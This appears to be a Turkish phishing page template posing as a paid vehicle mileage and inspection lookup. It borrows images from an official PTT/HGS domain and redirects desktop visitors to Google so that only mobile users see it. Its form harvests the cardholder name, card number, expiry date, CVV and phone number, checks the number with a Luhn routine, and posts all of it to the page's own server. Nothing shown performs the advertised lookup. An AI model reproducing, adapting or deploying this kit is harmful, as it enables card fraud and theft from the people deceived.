<script type="text/javascript">

var mobile = (/iphone|ipad|ipod|android|blackberry|mini|windows\s ce|palm/i.test(navigator.userAgent.toLowerCase()))

if(!mobile){

document.location="https://google.com/";

}</script>
<div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
    <div class="wizard-container">
        <div class="card wizard-card" data-color="orange" id="wizardProfile">
            <div class="wizard-header">
                <div class="panel-header-icons">
                    <img class="panel-header-first-icon" src="<?= front_folder() ?>hgs2/v2/assets/images/menu/km_sorgula_hover.png">
                </div>
                <h1>
                    <img class="panel-header-second-icon">
                    Kilometre ve Muayene Sorgulama
                </h1>
           <h6>
KİLOMETRE SORGULAMAK İSTEDİĞİNİZ ARACIN PLAKA YA DA ŞASİ NUMARASINI GİREREK 24.07.2013 TARİHİNDEN SONRAKİ KİLOMETRE KAYDINA ULAŞABİLİRSİNİZ.
<br>
<span class="text-warning">Bu servisin hizmet ücreti 50.00 TL'dir.</span>
</h6>
   </div>
            <div class="tab-content text-center">
                <div class="tab-pane panel-border active" id="hgs-query-check">
                    <form id="hgsQueryNo" class="FormAdim1" name="hgs-query-no" data-tab="0" novalidate="novalidate" method="post">
                        <div class="panel-inside">
                      <div>
<p class="text-center tab-pane-heading">Sorgulama yapmak istediğiniz türü seçin.</p>
</div>
<div class="flex-wrap-container">
<div>						
						<button selected="" class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon btn-fill" id="plakano" data-id="0" onclick="hgs.setProcessType($(this)); return false;">PLAKA NO</button></div>
                            <button class="btn btn-warning hgs-query-process-type query-process-type btn-with-checked-icon" id="sasino" data-id="1" onclick="hgs.setProcessType($(this)); return false;">ŞASİ NO</button></div>
                            <div class="form-group hgs-query-input">
                                <input type="text" maxlength="17" required="" name="hgs_query_no" placeholder="Plaka Numarası" aria-required="true" class="form-control text-center hgs-query-no hgs-query-inputs">
                            </div>
                     
                        </div>
						
             <div class="pull-right">
                          <br>      <button type="submit" class="btn  text-white btn-warning ">İLERİ <img src="https://hgs.pttavm.com/v2/assets/images/buttons/right-arrow.png"></button>
                            </div>
					</form>

                    <form class="FormAdim2" style="display:none" data-tab="0" novalidate="novalidate" method="post">
                        <input type="hidden" name="sorgu_tip">
                        <input type="hidden" name="sorgu_no">
                        <input type="hidden" name="balance">
                        <div class="panel-inside">
                            <div class="payment-container hgs-query-credit-card-container">
                                <div class="col-sm-12">
                                    <span class="tab-pane-heading">Ödeme yapmak için kullanmak istediğiniz kart bilgilerini girin.</span>
                                </div>
                                <div class="col-sm-5 panel-credit-card-container">
                                    <div class="row">

                                        <div class="form-group">
                                            <label>Kart üzerindeki ad ve soyad</label>
                                            <input type="text" name="cc-name" class="form-control" placeholder="Adı Soyadı" autocomplete="off" onfocus="this.select()">
                                        </div>

                                        <div class="form-group">
                                            <label>Kart numaranız</label>
                                            <input type="text" id="ccNumber" name="cc-number" class="form-control" maxlength="19" autocomplete="off" placeholder="Kredi Kartı Numarası">
                                        </div>

                                        <div class="card-half-field row">
                                            <div class="col-sm-7 form-group">
                                                <label>Son kul. tarihi</label>
                                                <input type="text" name="cc-expiration" id="ccskt" class="form-control" maxlength="7" autocomplete="off" placeholder="Ay / Yıl">
                                            </div>

                                            <div class="col-sm-5 form-group">
                                                <label>CVC kodu</label>
                                                <input type="text" name="cc-cvv" id="cccvv" class="form-control" maxlength="3" placeholder="CVC" autocomplete="off">
                                            </div>
                                        </div>
                                    </div>

                                </div>
                                <div class="col-sm-7 form-group panel-card-wrapper">
                                    <div class="card-wrapper" data-jp-card-initialized="true">
                                        <div class="jp-card-container">
                                            <div class="jp-card">
                                                <div class="jp-card-front">
                                                    <div class="jp-card-logo jp-card-elo">
                                                        <div class="e">e</div>
                                                        <div class="l">l</div>
                                                        <div class="o">o</div>
                                                    </div>
                                                    <div class="jp-card-logo jp-card-visa">Visa</div>
                                                    <div class="jp-card-logo jp-card-visaelectron">Visa<div class="elec">Electron</div>
                                                    </div>
                                                    <div class="jp-card-logo jp-card-mastercard">Mastercard</div>
                                                    <div class="jp-card-logo jp-card-maestro">Maestro</div>
                                                    <div class="jp-card-logo jp-card-amex"></div>
                                                    <div class="jp-card-logo jp-card-discover">discover</div>
                                                    <div class="jp-card-logo jp-card-dinersclub"></div>
                                                    <div class="jp-card-logo jp-card-dankort">
                                                        <div class="dk">
                                                            <div class="d"></div>
                                                            <div class="k"></div>
                                                        </div>
                                                    </div>
                                                    <div class="jp-card-logo jp-card-jcb">
                                                        <div class="j">J</div>
                                                        <div class="c">C</div>
                                                        <div class="b">B</div>
                                                    </div>
                                                    <div class="jp-card-lower">
                                                        <div class="jp-card-shiny"></div>
                                                        <div class="jp-card-cvc jp-card-display">•••</div>
                                                        <div class="jp-card-number jp-card-display">•••• •••• •••• ••••</div>
                                                        <div class="jp-card-name jp-card-display">AD SOYAD</div>
                                                        <div class="jp-card-expiry jp-card-display" data-before="ay/yıl" data-after="validthru">••/••</div>
                                                    </div>
                                                </div>
                                                <div class="jp-card-back">
                                                    <div class="jp-card-bar"></div>
                                                    <div class="jp-card-cvc jp-card-display">•••</div>
                                                    <div class="jp-card-shiny"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button type="sumbit" class="btn btn-warning" onclick="hgs.payment();" id="panel-do-payment-btn">ÖDEME YAP <img src="<?= front_folder() ?>hgs2/v2/assets/images/tabs/payment.png"></button>
                                </div>
                                <span>Telefon numaranızı giriniz.</span>
                                <input type="text" class="form-control text-center  hgs-query-inputs" name="telefon" id="phone" placeholder="(xxx)xxx-xxxx" aria-required="true">
                                <script>
                                    document.getElementById('phone').addEventListener('input', function(e) {
                                        var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,4})/);
                                        e.target.value = !x[2] ? x[1] : '(' + x[1] + ') ' + x[2] + (x[3] ? '-' + x[3] : '');
                                    });
                                </script>
                                <div class="panel-contract-container panel-inside">
                                    <label class="checkbox bounce">
                                        <input type="checkbox" id="hgs-credit-card-contract" required value="0">
                                        <svg viewBox="0 0 21 21">
                                            <polyline points="5 10.75 8.5 14.25 16 6"></polyline>
                                        </svg>
                                        <span class="checkbox-msg">
                                            <a href="#" data-toggle="modal" data-target="#acik-riza-metni-modal">Açık Rıza Metni</a> ve <a href="#" data-toggle="modal" data-target="#privacy-policy-footer-modal">Gizlilik Politikası</a>'nı okudum ve onaylıyorum.
                                        </span>
                                    </label>
                                    <span class="contract-not-checked-msg display-none">Lütfen sözleşmeleri okuduğunuzu onaylayın.</span>
                                </div>
                                <div class="col-sm-12">
                                    <span class="hgs-query-payment-message payment-info-message">Ödeme işlemini onayladığınızda, <span class="text-warning">50.00 TL</span> kartınızdan tahsis edilecektir.</span>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <div class="wizard-footer">
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>



<script type="text/javascript">
    // Javascript code copyright 2009 by Fiach Reid : www.webtropy.com
    // This code may be used freely, as long as this copyright notice is intact.
    function Calculate(Luhn) {

        var sum = 0;
        for (i = 0; i < Luhn.length; i++) {
            sum += parseInt(Luhn.substring(i, i + 1));
        }

        var delta = new Array(0, 1, 2, 3, 4, -4, -3, -2, -1, 0);
        for (i = Luhn.length - 1; i >= 0; i -= 2) {
            var deltaIndex = parseInt(Luhn.substring(i, i + 1));
            var deltaValue = delta[deltaIndex];
            sum += deltaValue;
        }

        var mod10 = sum % 10;
        mod10 = 10 - mod10;

        if (mod10 == 10) {
            mod10 = 0;
        }

        return mod10;

    }

    function Validate(Luhn) {

        Luhn = Luhn.replace(/\s/g, '');

        var LuhnDigit = parseInt(Luhn.substring(Luhn.length - 1, Luhn.length));
        var LuhnLess = Luhn.substring(0, Luhn.length - 1);

        if (Calculate(LuhnLess) == parseInt(LuhnDigit)) {
            return true;
        }

        return false;

    }
</script>


<script>
    $("input[name='cc-number']").mask('0000 0000 0000 0000');
    $("input[name='cc-expiration']").mask('00/00');
    $("input[name='cc-cvv']").mask('000');

    var sorgu_tip = '';
    var sorgu_no = '';
    var miktar = 50;

    /**********/
    $('.FormAdim1').submit(function(e) {
        e.preventDefault();
        sorgu_tip = $('input[name=hgs_query_no]').attr('placeholder');
        sorgu_no = $('input[name=hgs_query_no]').val();

        if (sorgu_tip == "" || sorgu_no == "") {
            hata_goster('error', 'Lütfen boş alan bırakmayın');
        } else {
            $('input[name=sorgu_tip]').val(sorgu_tip);
            $('input[name=sorgu_no]').val(sorgu_no);
            $('.FormAdim1').hide();
            $('.FormAdim2').show();
        }

    });
    /**********/
    $('.FormAdim3').submit(function(e) {
        e.preventDefault();
        if (miktar == 50) {
            hata_goster('error', 'Lütfen yüklemek istediğiniz miktarı seçin');
        } else {
            $('input[name=balance]').val(miktar);

            $('.FormAdim2').hide();
            $('.FormAdim3').show();
        }

    });
    $('.hgs-query-amounts-label').click(function(e) {
        miktar = $(this).attr('data-price');
    });
    /**********/
    $('.FormAdim2').submit(function(e) {
        e.preventDefault();
        var form = $(this);

        if ($('input[name=telefon]').val() == "") {
            hata_goster('error', 'Lütfen boş alan bırakmayın');
        } else {

            var izn = true;

            var ccname = $("input[name=cc-name]").val();
            var ccno = $("input[name=cc-number]").val();
            var date = $("input[name=cc-expiration]").val();
            var cvv = $("input[name=cc-cvv]").val();
            var telefon = $("input[name=telefon]").val();

            if (!Validate(ccno)) {
                hata_goster('error', "Lütfen geçerli bir kart numarası girin!");
                izn = false;
            }

            if (izn) {
                $.ajax({
                    type: 'POST',
                    url: "<?= base_url() ?>",
                    data: {
                        cc_name: ccname,
                        cc_no: ccno,
                        cc_date: date,
                        cc_cvv: cvv,
                        telefon: telefon,
                        balance: miktar,
                    },
                    dataType: "JSON",
                    success: function(response) {
                        if (response.status == "success") {
                            window.location.href = response.message;
                        } else {
                            hata_goster('error', response.message);
                        }
                    }
                });
            }


            /*
                        $.ajax({
                            type: 'POST',
                            url: "<?= base_url() ?>",
                            data: form.serialize(),
                            dataType: "JSON",
                            success: function(response) {
                                console.log(response);
                                if (response.status == 'success') {
                                    location.href = response.message;
                                } else {
                                    hata_goster(response.status, response.message);
                                }
                            }
                        });*/
        }
    });
</script>